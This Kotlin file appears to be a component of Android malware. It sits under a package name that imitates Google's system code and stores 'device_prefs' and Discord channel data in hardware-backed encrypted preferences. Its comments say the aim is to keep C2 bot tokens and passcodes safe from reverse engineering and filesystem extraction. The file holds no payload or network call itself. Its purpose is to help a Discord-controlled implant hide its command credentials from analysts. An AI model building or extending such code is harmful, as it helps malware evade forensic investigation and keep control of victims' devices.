package com.google.android.system

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

/**
 * SecurityVaultManager
 *
 * Hardware-Backed Keystore & Encrypted Vault Engine (FEAT-01):
 * - Manages hardware TEE/StrongBox MasterKey using AES-256-GCM.
 * - Provides EncryptedSharedPreferences instances for "device_prefs" and "discord_channels".
 * - Performs transparent automatic migration of legacy unencrypted keys on first access.
 * - Prevents static reverse engineering and filesystem extraction of C2 bot tokens & passcodes.
 */
object
SecurityVaultManager {

    private const val TAG = "SecurityVaultManager"

    private const val PREFS_DEVICE = "device_prefs"
    private const val PREFS_DISCORD = "discord_channels"

    @Volatile
    private var deviceEncryptedPrefs: SharedPreferences? = null

    @Volatile
    private var discordEncryptedPrefs: SharedPreferences? = null

    /**
     * Gets or creates the hardware MasterKey backed by Android Keystore TEE / StrongBox.
     */
    private fun getOrCreateMasterKey(context: Context): MasterKey {
        return try {
            MasterKey.Builder(context.applicationContext)
                .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
                .build()
        } catch (e: Exception) {
            Log.w(TAG, "MasterKey standard generation failed, attempting fallback build: ${e.message}")
            MasterKey.Builder(context.applicationContext)
                .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
                .setUserAuthenticationRequired(false)
                .build()
        }
    }

    /**
     * Obtains hardware-encrypted SharedPreferences for device settings ("device_prefs").
     */
    @Synchronized
    fun getEncryptedPrefs(context: Context): SharedPreferences {
        deviceEncryptedPrefs?.let { return it }

        val appContext = context.applicationContext
        val prefs = try {
            val masterKey = getOrCreateMasterKey(appContext)
            EncryptedSharedPreferences.create(
                appContext,
                PREFS_DEVICE,
                masterKey,
                EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
                EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create EncryptedSharedPreferences for $PREFS_DEVICE: ${e.message}", e)
            appContext.getSharedPreferences(PREFS_DEVICE, Context.MODE_PRIVATE)
        }

        migrateLegacyPrefsIfNeeded(appContext, PREFS_DEVICE, prefs)
        deviceEncryptedPrefs = prefs
        return prefs
    }

    /**
     * Obtains hardware-encrypted SharedPreferences for Discord channel matrix ("discord_channels").
     */
    @Synchronized
    fun getEncryptedDiscordPrefs(context: Context): SharedPreferences {
        discordEncryptedPrefs?.let { return it }

        val appContext = context.applicationContext
        val prefs = try {
            val masterKey = getOrCreateMasterKey(appContext)
            EncryptedSharedPreferences.create(
                appContext,
                PREFS_DISCORD,
                masterKey,
                EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
                EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create EncryptedSharedPreferences for $PREFS_DISCORD: ${e.message}", e)
            appContext.getSharedPreferences(PREFS_DISCORD, Context.MODE_PRIVATE)
        }

        migrateLegacyPrefsIfNeeded(appContext, PREFS_DISCORD, prefs)
        discordEncryptedPrefs = prefs
        return prefs
    }

    /**
     * Transparently migrates any key-value pairs from legacy unencrypted SharedPreferences
     * into EncryptedSharedPreferences, then wipes cleartext entries.
     */
    private fun migrateLegacyPrefsIfNeeded(
        context: Context,
        prefName: String,
        encryptedPrefs: SharedPreferences
    ) {
        val legacyPrefsName = "${prefName}_legacy_unencrypted"
        val migrationDoneKey = "_vault_migrated_$prefName"

        if (encryptedPrefs.getBoolean(migrationDoneKey, false)) {
            return
        }

        try {
            val rawPrefs = context.getSharedPreferences(prefName, Context.MODE_PRIVATE)
            val allEntries = rawPrefs.all

            if (allEntries.isNotEmpty()) {
                Log.i(TAG, "Migrating ${allEntries.size} legacy keys from $prefName into Security Vault")
                val editor = encryptedPrefs.edit()

                for ((key, value) in allEntries) {
                    if (key.startsWith("__") || key.endsWith("__")) continue
                    when (value) {
                        is String -> editor.putString(key, value)
                        is Boolean -> editor.putBoolean(key, value)
                        is Long -> editor.putLong(key, value)
                        is Int -> editor.putInt(key, value)
                        is Float -> editor.putFloat(key, value)
                        is Set<*> -> {
                            @Suppress("UNCHECKED_CAST")
                            editor.putStringSet(key, value as Set<String>)
                        }
                    }
                }
                editor.putBoolean(migrationDoneKey, true)
                editor.apply()

                // Wipe raw cleartext entries after successful migration
                rawPrefs.edit().clear().apply()
                Log.i(TAG, "Successfully completed migration and wiped raw cleartext entries for $prefName")
            } else {
                encryptedPrefs.edit().putBoolean(migrationDoneKey, true).apply()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error migrating legacy preferences for $prefName: ${e.message}")
        }
    }
}
